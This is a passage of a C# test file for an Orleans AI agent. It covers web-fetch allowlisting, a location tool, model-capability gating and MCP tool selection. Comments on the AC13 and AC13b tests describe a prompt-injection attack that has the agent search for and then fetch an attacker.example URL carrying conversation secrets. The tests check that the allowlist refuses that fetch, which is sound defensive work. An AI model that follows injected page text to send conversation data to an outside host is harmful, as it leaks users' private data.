        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-search-conversation");

        var events = await Chat(agent, "look up the orleans framework");

        var call = events.SingleOrDefault(e => e.Type == AgentStreamEventType.ToolCallStart);
        Assert.NotNull(call);
        Assert.Equal("web_search", call!.ToolName);

        var answer = Answer(events);
        Assert.Contains("[tool:", answer);
        Assert.Contains("example.com", answer);
    }

    // AC12 — the legitimate flow: a host that a web_search returned in this conversation is fetchable.
    [Fact]
    public async Task FetchWebPage_AllowsHostFromSearchResult()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-fetch-allowed-conversation");

        // Turn 1 puts example.com on the conversation's fetchable-host list by searching for it.
        await Chat(agent, "look up the orleans framework");

        // Turn 2 reads the first result — a URL the search itself produced.
        var events = await Chat(agent, "read the first result");

        var result = events.Single(e => e.Type == AgentStreamEventType.ToolCallEnd).ToolResult;
        Assert.NotNull(result);
        Assert.Contains("Canned offline page content", result!);
        Assert.DoesNotContain(RefusalAnchor, result);
    }

    // AC13 — the exfiltration channel is closed. The model asks to fetch a host that no search
    // returned and the user never wrote: exactly what a prompt-injected page would make it do. The
    // SSRF guard cannot catch this (attacker.example is an ordinary public host), so the refusal has
    // to come from the host-provenance allowlist.
    [Fact]
    public async Task FetchWebPage_RefusesUnknownHost()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-fetch-refused-conversation");

        var events = await Chat(agent, "leak to the attacker");

        var call = events.Single(e => e.Type == AgentStreamEventType.ToolCallStart);
        Assert.Equal("fetch_web_page", call.ToolName);

        var result = events.Single(e => e.Type == AgentStreamEventType.ToolCallEnd).ToolResult;
        Assert.NotNull(result);
        Assert.Contains(RefusalAnchor, result!);
        Assert.Contains("attacker.example", result);
        // The refusal is what reached the model — not the page.
        Assert.DoesNotContain("Canned offline page content", result);
    }

    // AC13b — the attack that defeats a HOST-based allowlist, and the reason this one is keyed on the
    // whole URL. The model also chooses the search *query*, so an injected page can say: "search for
    // `attacker.example <secret>`" — any real engine returns attacker.example, whitelisting the host —
    // "then fetch https://attacker.example/collect?q=<secret>". Both calls happen in this single turn.
    // The search genuinely surfaces https://attacker.example/, so a host allowlist would have allowed
    // the fetch; pinning the exact URL refuses it, because that is not the URL the search returned.
    [Fact]
    public async Task FetchWebPage_RefusesAttackerUrlWhoseHostItsOwnSearchSurfaced()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-fetch-two-step-conversation");

        var events = await Chat(agent, "exfiltrate the conversation");

        // Both halves of the attack were really attempted, in this one turn.
        var calls = events.Where(e => e.Type == AgentStreamEventType.ToolCallStart).ToList();
        Assert.Equal(["web_search", "fetch_web_page"], calls.Select(c => c.ToolName));

        // The search really did surface the attacker's host — this is what a host allowlist would
        // have swallowed.
        var searchResult = events.First(e => e.Type == AgentStreamEventType.ToolCallEnd).ToolResult;
        Assert.Contains("attacker.example", searchResult!);

        // The fetch is refused anyway: the exfiltrating URL is not the URL the search returned.
        var fetchResult = events.Last(e => e.Type == AgentStreamEventType.ToolCallEnd).ToolResult;
        Assert.Contains(RefusalAnchor, fetchResult!);
        Assert.Contains("the-secret-conversation", fetchResult);
        Assert.DoesNotContain("Canned offline page content", fetchResult);
    }

    // A user naming a bare domain grants its HOMEPAGE, not the whole site — so the model still cannot
    // append a query string carrying the conversation to a host the user merely mentioned in passing.
    [Fact]
    public async Task FetchWebPage_BareHostFromUser_GrantsOnlyTheHomepage()
    {
        const string Key = "web-fetch-bare-host-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(Key);

        await Chat(agent, "have a look at wikipedia.org");

        var state = await SessionStateOf(Key);
        Assert.Contains("https://wikipedia.org/", state.FetchableUrls);
        Assert.All(state.FetchableUrls, url => Assert.DoesNotContain("?", url));
    }

    // A tool result is JSON-serialized on its way to the model, which escapes apostrophes
    // ("won't"), so assertions anchor on an apostrophe-free phrase of the refusal — otherwise a
    // DoesNotContain would pass vacuously and prove nothing.
    private const string RefusalAnchor = "came back from a web_search in this conversation";

    // The other half of the decision (ADR 0011): a host the USER wrote is fetchable with no prior
    // search, so "read this link I pasted" still works.
    [Fact]
    public async Task FetchWebPage_AllowsHostFromUserMessage()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-fetch-user-host-conversation");

        // The user names the host themselves; the fake then fetches https://example.com/result-1.
        var events = await Chat(agent, "read the first result at https://example.com/result-1 please");

        var result = events.Single(e => e.Type == AgentStreamEventType.ToolCallEnd).ToolResult;
        Assert.NotNull(result);
        Assert.Contains("Canned offline page content", result!);
    }

    // AC14 — the sharpest edge in this feature (ADR 0004): a tool result is persisted into the session,
    // which is re-serialized into ONE 2 MB Cosmos item every turn.
    //
    // The fetcher here is deliberately NOT the in-memory one: its canned page is ~50 characters, three
    // orders of magnitude under the ceiling, so the assertion would hold even if the 8 KB cap were
    // deleted — it would prove nothing. CapSizedWebPageFetcher returns the largest page the real
    // fetcher is allowed to return, so this ceiling actually binds against WebToolLimits: raise the cap
    // to 1 MB, or drop the truncation in WebPageFetcher, and this test goes red.
    [Fact]
    public async Task ToolResults_DoNotBlowTheSessionSizeBudget()
    {
        await using var cluster = await NewClusterAsync<CapSizedFetcherSiloConfigurator>();
        const string Key = "web-session-budget-conversation";
        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>(Key);

        // Five worst-case turns: each fetch returns a full-size (capped) page into the session. Each
        // round also runs the location tool (ADR 0012), whose return value is persisted into the very
        // same item — a new tool that returned Google's raw geocoding response, rather than the budgeted
        // record, would show up here.
        for (var turn = 0; turn < 5; turn++)
        {
            await Chat(agent, "look up the orleans framework");
            await Chat(agent, "read the first result");
            await ChatAt(agent, "where am i", Dam());
        }

        var storage = cluster.GetSiloServiceProvider(cluster.Primary.SiloAddress)
            .GetRequiredKeyedService<IGrainStorage>(AgentGrain.StorageProviderName);
        var state = new GrainState<AgentGrainState>(new AgentGrainState());
        await storage.ReadStateAsync(
            "agent", cluster.GrainFactory.GetGrain<IAgentGrain>(Key).GetGrainId(), state);

        var bytes = System.Text.Encoding.UTF8.GetByteCount(state.State.SerializedSession ?? "");

        // Sanity: the pages really are cap-sized, so the ceiling below is a real constraint.
        Assert.True(bytes > WebToolLimits.MaxPageTextLength,
            "the fetched pages should be full-size, or this test proves nothing");

        // Cosmos hard-caps the item at 2 MB. Five capped fetches (~40 KB of page text) must stay far
        // inside it; 256 KB catches an unbudgeted tool result long before production would.
        Assert.InRange(bytes, 1, 256 * 1024);
    }

    // ---- User location (ADR 0012) ----

    // A fix on the Dam in Amsterdam. FakeGeocoder resolves any valid fix to one canned address.
    private static UserLocation Dam(DateTimeOffset? capturedAt = null) =>
        new(52.3676, 4.9041, AccuracyMetres: 12, CapturedAt: capturedAt ?? DateTimeOffset.UtcNow);

    // AC1 — a turn that carries a position lets the tool report BOTH the coordinates and the
    // reverse-geocoded address, and both reach the model (the fake echoes tool results as [tool:…] —
    // the same discipline as the web-search test: a tool that ran proves plumbing, not delivery).
    [Fact]
    public async Task GetCurrentLocation_ReturnsAddress_WhenTurnCarriesPosition()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("location-conversation");

        var events = await ChatAt(agent, "where am i", Dam());

        var call = events.SingleOrDefault(e => e.Type == AgentStreamEventType.ToolCallStart);
        Assert.NotNull(call);
        Assert.Equal("get_current_location", call!.ToolName);

        var answer = Answer(events);
        Assert.Contains("[tool:", answer);
        Assert.Contains(FakeGeocoder.Address, answer);
        Assert.Contains("52.3676", answer);
    }

    // AC2 — with no position on the turn, the tool must SAY SO rather than invent one, and must tell the
    // model to ask the user to share it. The tool is the only thing that knows; nothing else in the turn
    // can surface it.
    //
    // The assertion anchors on an apostrophe- and quote-free phrase on purpose: a tool result is
    // JSON-serialized on its way to the model, which escapes both — an assertion containing "don't" or
    // a quoted "Share my location" would pass vacuously (see the fetch-allowlist gotcha).
    [Fact]
    public async Task GetCurrentLocation_WhenNotShared_TellsModelToAskTheUser()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("no-location-conversation");

        var answer = Answer(await Chat(agent, "where am i"));

        Assert.Contains("has not shared their location", answer);
        // Points the user at the grant control's real home (Preferences) — quote-free so it can't pass
        // vacuously through JSON escaping, and it caught the composer-button copy going stale once already.
        Assert.Contains("Preferences", answer);
        Assert.DoesNotContain(FakeGeocoder.Address, answer);
    }

    // AC3 — the position is turn-scoped. A later turn WITHOUT one must not see the earlier turn's fix:
    // the field lives for the ACTIVATION, not the call, so without the explicit clear this second turn
    // would still confidently answer "Damrak 1".
    //
    // Both assertions are made on the turn's OWN ToolCallEnd result, not on the reply text. That is not
    // fussiness: the fake echoes every tool result it can see, and by turn 2 the model legitimately sees
    // turn 1's result replayed from history — so the reply text contains the old address no matter what
    // the grain does, and an assertion on it would be testing the fake, not the field.
    [Fact]
    public async Task Location_IsTurnScoped_AndNotPersisted()
    {
        const string Key = "turn-scoped-location-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(Key);

        // Turn 1 carries a fix and resolves an address.
        Assert.Contains(FakeGeocoder.Address, ToolResult(await ChatAt(agent, "where am i", Dam())));

        // Turn 2, on the same warm activation, carries none.
        var second = ToolResult(await Chat(agent, "where am i"));
        Assert.Contains("has not shared their location", second);
        Assert.DoesNotContain(FakeGeocoder.Address, second);

        // The position is never grain STATE. What IS persisted is the tool's return value, which carries
        // the address and the coordinates into chat history — that is the user's explicit choice (full
        // precision, persisted, re-sent every later turn) and ADR 0012 records it. What must never exist
        // is a location field on AgentGrainState: that would outlive the turn it was captured for, and a
        // fix from last week would be re-sent as if it were current.
        Assert.DoesNotContain(
            typeof(AgentGrainState).GetProperties(),
            p => p.PropertyType == typeof(UserLocation)
                || p.Name.Contains("Location", StringComparison.OrdinalIgnoreCase));
    }

    // AC4 — the reminder path never claims to know where the user is. This is the bug the plan's first
    // draft contained: _turnLocation lives for the ACTIVATION, so a reminder firing on the same
    // activation as a located chat turn would still see that turn's fix and announce the user's position
    // hours later, somewhere else. The reminder's own prompt asks "where am i" (see FakeChatClient), so
    // the tool really is invoked on that path — an assertion that never reached the tool would prove
    // nothing.
    [Fact]
    public async Task ReceiveReminder_HasNoUserLocation()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("reminder-location-conversation");

        // A located turn that also schedules a reminder whose prompt asks where the user is. The
        // activation now holds a fix.
        await ChatAt(agent, "schedule a location check", Dam());

        // Fire it on that same warm activation.
        await agent.AsReference<IRemindable>().ReceiveReminder("location-check", default);

        var history = await agent.GetHistoryAsync();
        var reply = history.Last(t => t.Role == "assistant").Text;

        Assert.Contains("has not shared their location", reply);
        Assert.DoesNotContain(FakeGeocoder.Address, reply);
    }

    // AC10 (the behavioural half) — with NO API key configured, the app still runs and the tool still
    // works: it reports the coordinates and says plainly that no street address could be resolved. That
    // is the whole "a missing key degrades the feature, it does not take the app down" claim of ADR 0012,
    // and it needs a test on a silo running the REAL CoordinatesOnlyGeocoder — every other grain test
    // uses FakeGeocoder, which always resolves, so this path never executes there.
    [Fact]
    public async Task GetCurrentLocation_WithoutAGeocodingKey_ReturnsCoordinatesWithoutAnAddress()
    {
        await using var cluster = await NewClusterAsync<CoordinatesOnlyGeocoderSiloConfigurator>();
        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>("no-geocoder-conversation");

        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync("where am i", null, null, Dam()))
        {
            events.Add(evt);
        }

        var result = ToolResult(events);

        // The coordinates are there…
        Assert.Contains("52.3676", result);
        Assert.Contains("4.9041", result);
        // …the tool did not throw, did not claim the user is unknown, and did not invent a street.
        Assert.DoesNotContain("has not shared their location", result);
        Assert.Contains("no street address could be resolved", result);
        Assert.DoesNotContain(FakeGeocoder.Address, result);
    }

    // AC13 — the tool exposes NO parameters to the model, and that is a security property, not a style
    // choice: it is half of why the outbound geocode call is not an SSRF sink (the other half is the
    // config-pinned host). A later contributor adding a `[Description("address")] string` parameter
    // would silently turn it into one — with the reassuring "not an SSRF sink" comment still sitting
    // above it. So the shape is pinned here rather than trusted to a comment.
    //
    // Asserts on the JSON SCHEMA the model actually sees — not the CLR signature — because the schema is
    // what the security property is actually about. (The method does take a CancellationToken;
    // AIFunctionFactory supplies that from the invocation context and keeps it out of the schema, so the
    // model can neither see nor set it. Asserting on the signature would therefore fail for a parameter
    // that is not a parameter as far as the model is concerned.) Built from the very method the grain
    // registers; an uninitialized instance is enough, since building an AIFunction reads the signature
    // rather than invoking it.
    [Fact]
    public void GetCurrentLocation_ExposesNoParameters()
    {
        var method = typeof(AgentGrain).GetMethod(
            "GetCurrentLocationAsync", BindingFlags.Instance | BindingFlags.NonPublic);
        Assert.NotNull(method);

        // Nothing the model could put a host, a path, or an address into.
        Assert.All(
            method!.GetParameters(),
            p => Assert.Equal(typeof(CancellationToken), p.ParameterType));

        var function = AIFunctionFactory.Create(
            method, RuntimeHelpers.GetUninitializedObject(typeof(AgentGrain)));

        Assert.False(
            function.JsonSchema.TryGetProperty("properties", out var properties)
                && properties.EnumerateObject().Any(),
            "get_current_location must expose no parameters to the model (ADR 0012).");
    }

    private static async Task<TestCluster> NewClusterAsync<TConfigurator>(short initialSilosCount = 2)
        where TConfigurator : ISiloConfigurator, new()
    {
        var builder = new TestClusterBuilder(initialSilosCount);
        builder.AddSiloBuilderConfigurator<TConfigurator>();
        var cluster = builder.Build();
        await cluster.DeployAsync();
        return cluster;
    }

    // AC15 — the guidance reaches the model. Skills are advertised in the instructions by the
    // AgentSkillsProvider (progressive disclosure), and the fake echoes the instructions as [sys:…] —
    // the same technique the bound-persona test uses.
    [Fact]
    public async Task WebSearchSkill_IsAdvertisedToTheModel()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("web-skill-conversation");

        var answer = Answer(await Chat(agent, "hi"));

        Assert.Contains("[sys:", answer);
        Assert.Contains("websearch", answer);
    }

    // The allowlist is bounded, so a long-running conversation can't grow the session item without
    // limit (ADR 0004). Drives the grain through a real chat turn rather than poking state directly.
    [Fact]
    public async Task FetchableUrls_AreBounded()
    {
        const string Key = "web-host-bound-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(Key);

        // Each turn contributes one new URL from the user's own text.
        for (var i = 0; i < AgentGrain.MaxFetchableUrls + 10; i++)
        {
            await Chat(agent, $"have a look at host{i}.example.com");
        }

        var state = await SessionStateOf(Key);
        Assert.InRange(state.FetchableUrls.Count, 1, AgentGrain.MaxFetchableUrls);
        // Oldest out first: the earliest URL is gone, the most recent survives.
        Assert.DoesNotContain("https://host0.example.com/", state.FetchableUrls);
        Assert.Contains($"https://host{AgentGrain.MaxFetchableUrls + 9}.example.com/", state.FetchableUrls);
    }

    private static async Task<List<AgentStreamEvent>> Chat(IAgentGrain agent, string message)
    {
        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync(message, null))
        {
            events.Add(evt);
        }

        return events;
    }

    // Drains an already-built chat stream. Chat/ChatAt above cover the common turns; the model-capability
    // tests (ADR 0013) need to pass a model id and attachments together, so they build the call themselves.
    private static async Task<List<AgentStreamEvent>> CollectAsync(IAsyncEnumerable<AgentStreamEvent> stream)
    {
        var events = new List<AgentStreamEvent>();
        await foreach (var evt in stream)
        {
            events.Add(evt);
        }

        return events;
    }

    // Same, but the turn carries the user's position — the shape a located chat request takes (ADR 0012).
    private static async Task<List<AgentStreamEvent>> ChatAt(
        IAgentGrain agent, string message, UserLocation location)
    {
        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync(message, null, null, location))
        {
            events.Add(evt);
        }

        return events;
    }

    // The tool result produced by THIS turn, straight off the stream. Use it instead of the reply text
    // whenever a test needs to isolate one turn: the fake echoes every tool result the model can see,
    // and results from earlier turns are replayed to it from history.
    private static string ToolResult(IEnumerable<AgentStreamEvent> events) =>
        string.Concat(events
            .Where(e => e.Type == AgentStreamEventType.ToolCallEnd)
            .Select(e => e.ToolResult));

    private static string Answer(IEnumerable<AgentStreamEvent> events) =>
        string.Concat(events
            .Where(e => e.Type == AgentStreamEventType.TextDelta)
            .Select(e => e.Text));

    // The fake echoes the REGISTERED tool names inside a [tools:a,b,c] marker (see FakeChatClient).
    // Absence assertions must scope to this marker, NOT the whole answer: the skills provider injects
    // each skill's description into the system prompt, and the `websearch` skill's text names
    // web_search/fetch_web_page — so those substrings appear in the answer even when the tools don't.
    private static string ToolNames(string answer) =>
        System.Text.RegularExpressions.Regex.Match(answer, @"\[tools:([^\]]*)\]").Groups[1].Value;

    // ---- Model capabilities (ADR 0013) ----------------------------------------------------------
    //
    // Every assertion below reads the fake's [tools:N] / [img:N] echoes, which are built from what the
    // TERMINAL chat client actually received. That matters: asserting on the grain's intent would pass
    // even if the capability gate never reached the model.

    // AC7: a no-tools model gets ZERO function schemas — and that must include load_skill, which
    // AgentSkillsProvider contributes. Dropping the seven AIFunctionFactory tools but leaving the
    // skills provider on would still hand the model a function schema it cannot handle.
    [Fact]
    public async Task NoToolModel_RegistersNoTools_AndNoSkillsProvider()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("no-tools-conversation");

        var events = await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.NoToolsNoVisionModel));

        var answer = Answer(events);
        Assert.Contains("[tools:]", answer);
        Assert.DoesNotContain("load_skill", answer);
    }

    // AC8: the tools-capable path is unchanged — all seven tools, plus the skills provider's load_skill.
    [Fact]
    public async Task ToolModel_StillRegistersAllTools()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("tools-conversation");

        var events = await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.DefaultModel));

        var answer = Answer(events);
        foreach (var tool in new[]
        {
            "schedule_prompt", "cancel_scheduled_prompt", "cancel_all_scheduled_prompts", "get_date",
            "web_search", "fetch_web_page", "get_current_location", "load_skill",
        })
        {
            Assert.Contains(tool, answer);
        }

        // The default (Chat Completions) model has NO hosted tool: code_interpreter comes only from
        // HostedCodeInterpreterTool, so its absence from the tool list proves no hosted tools rode here.
        Assert.DoesNotContain("code_interpreter", ToolNames(answer));
    }

    // A Responses-API model (ADR 0014) reaches OpenAI's hosted server-side tools, so the grain swaps its
    // self-hosted SearXNG shims for the native ones: web_search now comes from HostedWebSearchTool and
    // code_interpreter from HostedCodeInterpreterTool; the SearXNG web_search + fetch_web_page shims drop
    // (no double web search). The other local tools and load_skill stay.
    [Fact]
    public async Task HostedToolsModel_SwapsWebShimsForHostedTools()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("hosted-tools-conversation");

        var events = await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.HostedToolsModel));

        var registered = ToolNames(Answer(events));
        // The hosted pair is present. HostedWebSearchTool surfaces under the protocol name `web_search`
        // (the same name the shim used), and HostedCodeInterpreterTool under `code_interpreter`.
        Assert.Contains("web_search", registered);
        Assert.Contains("code_interpreter", registered);
        // The SearXNG shims are dropped. fetch_web_page is UNIQUE to them, so its absence proves the
        // swap — web_search alone can't, since the hosted tool reuses that exact name.
        Assert.DoesNotContain("fetch_web_page", registered);
        // The non-web tools and the skills provider are untouched by the swap.
        foreach (var tool in new[] { "schedule_prompt", "get_date", "get_current_location", "load_skill" })
        {
            Assert.Contains(tool, registered);
        }
    }

    // AC9: the document TextSearchProvider is NOT a tool — it injects excerpts before the call — so a
    // document conversation keeps working on a no-tools model. This is the asymmetry with the skills
    // provider above, and the reason the two are gated differently.
    [Fact]
    public async Task NoToolModel_StillGetsDocumentRetrieval()
    {
        const string key = "no-tools-doc-conversation";
        await SeedChunkAsync(key, new DocumentChunk("guide.pdf", 2, 0, "Magrathea is a legendary planet of untold wealth."));

        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        await agent.RegisterDocumentAsync("guide.pdf");

        var events = await CollectAsync(
            agent.ChatAsync("what does the document say about magrathea", TestSiloConfigurator.NoToolsNoVisionModel));

        var answer = Answer(events);
        Assert.Contains("[tools:]", answer);
        Assert.Contains("Magrathea is a legendary planet", answer);
    }

    // AC10: switching a conversation that has ALREADY called tools onto a no-tools model must not
    // replay FunctionCallContent/FunctionResultContent in a request that declares no tools. GitHub
    // Models tolerates that today (ADR 0013 spike), but many OpenAI-compatible endpoints 400 on it and
    // the conversation would be stuck. The strip is what keeps it answerable.
    [Fact]
    public async Task SwitchToNoToolModel_StripsToolHistory_AndStillReplies()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("downgrade-conversation");

        // Turn 1, on the fully-capable model: actually call a tool, so history carries tool content.
        var first = await CollectAsync(agent.ChatAsync("please remind me to drink water", null));
        Assert.Contains(first, e => e.Type == AgentStreamEventType.ToolCallStart);

        // Turn 2: the same conversation, now on a model with no tools.
        var second = await CollectAsync(agent.ChatAsync("hello again", TestSiloConfigurator.NoToolsNoVisionModel));

        var answer = Answer(second);
        Assert.Contains("[tools:]", answer);

        // The fake echoes every tool result still visible to the model. Turn 1's result was stripped,
        // so it must not come back — and the conversation still answers.
        Assert.DoesNotContain("[tool:", answer);
        Assert.Equal(AgentStreamEventType.Done, second[^1].Type);
    }

    // AC11: a model that cannot see images receives NO image content — not the new turn's, and (the
    // half that is easy to miss) not prior turns' either, since those live on in the session and would
    // be replayed. An image reaches the model as a SAS URL into our PRIVATE attachments container, so
    // this is a leak of a credential-bearing URL, not merely a wasted turn.
    [Fact]
    public async Task NoVisionModel_SendsNoImageContent()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("no-vision-conversation");
        var reference = new AttachmentRef("nv-1", "k/nv-1", "image/png", "pic.png");

        // Turn 1 on a vision model: the image reaches the model.
        var first = await CollectAsync(agent.ChatAsync("what is in this picture", null, [reference]));
        Assert.Contains("[img:1]", Answer(first));

        // Turn 2, same conversation, on a tools-capable but BLIND model, carrying another image.
        var second = new AttachmentRef("nv-2", "k/nv-2", "image/png", "pic2.png");
        var events = await CollectAsync(
            agent.ChatAsync("and this one", TestSiloConfigurator.NoVisionModel, [second]));

        var answer = Answer(events);

        // [allimg:0] is the assertion that matters, and [img:0] would not be enough: it counts image
        // parts across the WHOLE request, so it proves turn 1's image was withheld from this model too —
        // not merely that the new attachment was. A single surviving history part would hand a SAS URL
        // for our private container to an endpoint that cannot even read it.
        Assert.Contains("[allimg:0]", answer);
        Assert.Contains("cannot see images", answer);

        // Turn 3, back on the vision model: the withholding was REVERSIBLE. TurnAttachments is the
        // durable record of each turn's images, so both are restored to the model's view rather than
        // lost forever by one visit to a text-only model.
        var third = await CollectAsync(agent.ChatAsync("describe them again", TestSiloConfigurator.DefaultModel));
        Assert.Contains("[allimg:2]", Answer(third));
    }

    // AC11, the case the first implementation got wrong: an IMAGE-ONLY turn (blank text, one photo — a
    // shape the composer deliberately allows) has nothing but image parts. Withholding them leaves the
    // message with ZERO content parts, and an empty message is rejected outright by OpenAI-compatible
    // endpoints — bricking the conversation on exactly the third-party model this feature is for. The
    // stripped turn must keep a placeholder instead.
    [Fact]
    public async Task NoVisionModel_ImageOnlyTurn_StillReplies_AndSendsNoImage()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("no-vision-imageonly-conversation");
        var reference = new AttachmentRef("io-1", "k/io-1", "image/png", "pic.png");

        // Turn 1 on a vision model: blank text, image only.
        await CollectAsync(agent.ChatAsync("", null, [reference]));

        // Turn 2 on a blind model: turn 1's message is now image-only-with-images-removed.
        var events = await CollectAsync(agent.ChatAsync("what did I send?", TestSiloConfigurator.NoVisionModel));

        var answer = Answer(events);
        Assert.Contains("[allimg:0]", answer);

        // The load-bearing assertion. Stripping turn 1's only content part would leave an EMPTY user
        // message, which a real OpenAI-compatible endpoint rejects — the fake would answer it happily,
        // so without this marker the test would pass while the conversation was bricked in production.
        Assert.Contains("[emptymsg:0]", answer);
        Assert.Equal(AgentStreamEventType.Done, events[^1].Type);

        // The turn is still in history and still joined to its image, so the UI renders it and switching
        // back to a vision model restores it.
        var userTurns = (await agent.GetHistoryAsync()).Where(t => t.Role == "user").ToList();
        Assert.Contains(userTurns, t => t.Attachments is { Count: 1 });
    }

    // The picker is not the only path that changes a conversation's model: BindAgentAsync is the other,
    // and an agent's Model is a qualified id since ADR 0013 — so it can name a no-tools model.
    [Fact]
    public async Task BindingToNoToolModel_RegistersNoTools()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("bind-no-tools-conversation");

        await agent.BindAgentAsync(new AgentBinding(
            "agent-1", "Terse", "You are terse.", TestSiloConfigurator.NoToolsNoVisionModel));

        var events = await CollectAsync(agent.ChatAsync("hi", null));

        var answer = Answer(events);
        Assert.Contains("[tools:]", answer);
        Assert.DoesNotContain("load_skill", answer);
    }

    // ---- Selectable tools (ADR 0021) -------------------------------------------------------------
    //
    // Every assertion reads the fake's [tools:…] echo (what the TERMINAL client received). Negative
    // tool assertions scope to ToolNames(...), NOT the whole answer: the skills provider leaks tool
    // names into the system prompt (see the ToolNames comment). load_skill is the one exception — it
    // comes ONLY from the skills provider, so its presence/absence is asserted on the whole answer,
    // mirroring ToolModel_StillRegistersAllTools / NoToolModel_RegistersNoTools_AndNoSkillsProvider.

    // Step-2 guard: every tool the grain actually registers maps to a catalog key, is the always-on
    // get_date, OR is an MCP tool (config-driven remote MCP servers) — the documented group-gated exception,
    // whose user-defined names deliberately map to NO catalog key. Reads the REAL registration off the fake's
    // echo on both a Chat model and a hosted model (which adds code_interpreter), with an MCP tool injected —
    // so a NON-MCP tool added later without a catalog entry still fails here. MCP tools are identified by the
    // provider's set, never by name-guessing.
    [Fact]
    public async Task EveryRegisteredTool_MapsToACatalogKey_OrIsGetDate_OrIsAnMcpTool()
    {
        var mcpTool = FakeMcpTool();
        await using var cluster = await NewClusterWithMcpToolsAsync(mcpTool);
        var mcpNames = new HashSet<string>(StringComparer.Ordinal) { mcpTool.Name };

        foreach (var model in new[] { TestSiloConfigurator.DefaultModel, TestSiloConfigurator.HostedToolsModel })
        {
            var agent = cluster.GrainFactory.GetGrain<IAgentGrain>($"catalog-guard-{model}");
            var registered = ToolNames(Answer(await CollectAsync(agent.ChatAsync("hi", model))));

            foreach (var name in registered.Split(',', StringSplitOptions.RemoveEmptyEntries))
            {
                Assert.True(
                    name == ToolCatalog.AlwaysOnDateTool || ToolCatalog.KeyFor(name) is not null || mcpNames.Contains(name),
                    $"Registered tool '{name}' on model '{model}' maps to no catalog key, is not get_date, and is not an MCP tool.");
            }

            // The carve-out is non-vacuous: the MCP tool really was registered and really maps to no key.
            Assert.Contains(mcpTool.Name, registered);
            Assert.Null(ToolCatalog.KeyFor(mcpTool.Name));
        }
    }

    // A fake MCP tool with a user-defined name that maps to no catalog key — stands in for a remote MCP
    // server's tool (config-driven remote MCP servers).
    private static AIFunction FakeMcpTool(string name = "mcp_do_thing") =>
        AIFunctionFactory.Create(() => "ok", name, "a remote MCP server tool");

    // A fresh single-silo cluster whose per-user MCP seam hands back the given tools for every user — so an
    // MCP-injecting test never contaminates the class-level _cluster (the provider singleton is per silo).
    private static async Task<TestCluster> NewClusterWithMcpToolsAsync(params AITool[] tools)
    {
        var cluster = await NewClusterAsync<TestSiloConfigurator>(1);
        cluster.GetSiloServiceProvider(cluster.Primary.SiloAddress)
            .GetRequiredService<SingleUserMcpToolProvider>().Tools = tools;
        return cluster;
    }

    // AC1: an explicitly-enabled `mcp` selection on a tools-capable model reaches the model.
    [Fact]
    public async Task McpTools_ReachModel_WhenEnabledAndToolsCapable()
    {
        await using var cluster = await NewClusterWithMcpToolsAsync(FakeMcpTool());
        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>("mcp-enabled");
        await agent.SetEnabledToolsAsync([ToolCatalog.Mcp]);

        var registered = ToolNames(Answer(await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.DefaultModel))));

        Assert.Contains("mcp_do_thing", registered);
        Assert.DoesNotContain("web_search", registered); // only mcp selected
    }

    // AC2: disabling the `mcp` key (a selection without it) drops all MCP tools.
    [Fact]
    public async Task McpDisabled_DropsMcpTools()
    {
        await using var cluster = await NewClusterWithMcpToolsAsync(FakeMcpTool());
        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>("mcp-disabled");
        await agent.SetEnabledToolsAsync([ToolCatalog.WebSearch]); // mcp not selected

        var registered = ToolNames(Answer(await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.DefaultModel))));

        Assert.DoesNotContain("mcp_do_thing", registered);
        Assert.Contains("web_search", registered); // the override itself works
    }

    // AC3: a no-tools model gets ZERO tools — including MCP tools — even with `mcp` enabled (capability is
    // the outer gate; selection can only narrow, ADR 0013/0021).
    [Fact]
    public async Task NoToolModel_GetsNoMcpTools()
    {
        await using var cluster = await NewClusterWithMcpToolsAsync(FakeMcpTool());
        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>("mcp-notools");

        var answer = Answer(await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.NoToolsNoVisionModel)));

        Assert.Contains("[tools:]", answer);
        Assert.DoesNotContain("mcp_do_thing", ToolNames(answer));
    }

    // AC4: MCP tools appear on the FIRST turn of a fresh activation (null == all default, no override, no
    // model switch) — proving _mcpTools was resolved in OnActivateAsync BEFORE the first BuildAgent, not
    // lazily on a later rebuild (the ordering hazard). Mirrors UserDefault_AppliesWhenNoOverride.
    [Fact]
    public async Task McpTools_ResolvedBeforeFirstBuildAgent()
    {
        await using var cluster = await NewClusterWithMcpToolsAsync(FakeMcpTool());
        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>("mcp-ordering");

        var registered = ToolNames(Answer(await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.DefaultModel))));

